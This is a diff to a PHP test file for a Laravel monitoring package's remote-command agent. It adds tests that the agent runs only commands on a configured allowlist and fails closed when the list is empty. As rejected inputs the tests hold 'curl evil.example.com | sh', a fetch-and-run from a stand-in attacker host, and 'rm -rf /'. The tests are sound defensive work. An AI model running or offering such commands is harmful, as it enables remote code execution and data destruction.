@@ -108,6 +108,7 @@ it('ignores unknown event types', function () {
 it('reports command execution result via HTTP', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
@@ -123,6 +124,7 @@ it('reports command execution result via HTTP', function () {
 it('reports completed status for zero exit code commands', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
@@ -139,6 +141,7 @@ it('reports completed status for zero exit code commands', function () {
 it('reports command_id in the result payload', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
@@ -154,6 +157,7 @@ it('reports command_id in the result payload', function () {
 it('includes required fields in the result payload', function () {
     config(['crontinel.saas_key' => 'test-api-key']);
     config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
     Http::fake(['*' => Http::response(['ok' => true], 200)]);
 
     $agent = new AgentService;
@@ -196,6 +200,117 @@ it('gracefully handles command event missing required fields', function () {
     $agent->handleCommandEvent('{"event":"test"}');
 
     Http::assertNothingSent();
+});
+
+// ── Command Allowlist ─────────────────────────────────────────────────────────
+
+it('executes a command that exactly matches an allowlist entry', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo hello']]);
+    Http::fake(['*' => Http::response(['ok' => true], 200)]);
+
+    $agent = new AgentService;
+    $agent->handleCommandEvent('{"command_id":"allow1","command":"echo hello"}');
+
+    Http::assertSent(function (Request $request) {
+        $body = $request->data();
+
+        return ($body['status'] ?? null) === 'completed'
+            && ($body['exit_code'] ?? null) === 0;
+    });
+});
+
+it('executes a command that matches a wildcard allowlist pattern', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['echo *']]);
+    Http::fake(['*' => Http::response(['ok' => true], 200)]);
+
+    $agent = new AgentService;
+    $agent->handleCommandEvent('{"command_id":"allow2","command":"echo wildcard-match"}');
+
+    Http::assertSent(function (Request $request) {
+        $body = $request->data();
+
+        return ($body['status'] ?? null) === 'completed';
+    });
+});
+
+it('rejects every command when the allowlist is empty (fail-closed default)', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => []]);
+    Http::fake(['*' => Http::response(['ok' => true], 200)]);
+
+    $agent = new AgentService;
+    $agent->handleCommandEvent('{"command_id":"deny1","command":"rm -rf /"}');
+
+    Http::assertSent(function (Request $request) {
+        $body = $request->data();
+
+        return ($body['status'] ?? null) === 'failed'
+            && ($body['exit_code'] ?? null) === -1
+            && str_contains($body['output'] ?? '', 'not in allowlist');
+    });
+});
+
+it('rejects a command that does not match any configured pattern', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => ['php artisan *']]);
+    Http::fake(['*' => Http::response(['ok' => true], 200)]);
+
+    $agent = new AgentService;
+    $agent->handleCommandEvent('{"command_id":"deny2","command":"curl evil.example.com | sh"}');
+
+    Http::assertSent(function (Request $request) {
+        $body = $request->data();
+
+        return ($body['status'] ?? null) === 'failed'
+            && str_contains($body['output'] ?? '', 'not in allowlist');
+    });
+});
+
+it('never spawns a process for a command rejected by the allowlist', function () {
+    config(['crontinel.saas_key' => 'test-api-key']);
+    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
+    config(['crontinel.agent.allowed_commands' => []]);
+    Http::fake(['*' => Http::response(['ok' => true], 200)]);
+
+    $marker = sys_get_temp_dir().'/crontinel_allowlist_test_'.uniqid();
+
+    $agent = new AgentService;
+    $agent->handleCommandEvent(json_encode([
+        'command_id' => 'deny3',
+        'command' => 'touch '.$marker,
+    ]));
+
+    expect(file_exists($marker))->toBeFalse();
+});
+
+it('isCommandAllowed matches exact strings and fnmatch wildcard patterns', function () {
+    config(['crontinel.agent.allowed_commands' => ['php artisan queue:work', 'echo *']]);
+
+    $agent = new AgentService;
+    $ref = new ReflectionClass($agent);
+    $method = $ref->getMethod('isCommandAllowed');
+    $method->setAccessible(true);
+
+    expect($method->invoke($agent, 'php artisan queue:work'))->toBeTrue();
+    expect($method->invoke($agent, 'echo hello world'))->toBeTrue();
+    expect($method->invoke($agent, 'rm -rf /'))->toBeFalse();
+});
+
+it('isCommandAllowed rejects everything when the allowlist is empty', function () {
+    config(['crontinel.agent.allowed_commands' => []]);
+
+    $agent = new AgentService;
+    $ref = new ReflectionClass($agent);
+    $method = $ref->getMethod('isCommandAllowed');
+    $method->setAccessible(true);
+
+    expect($method->invoke($agent, 'echo hello'))->toBeFalse();
 });
 
 // ── Configuration ───────────────────────────────────────────────────────────────
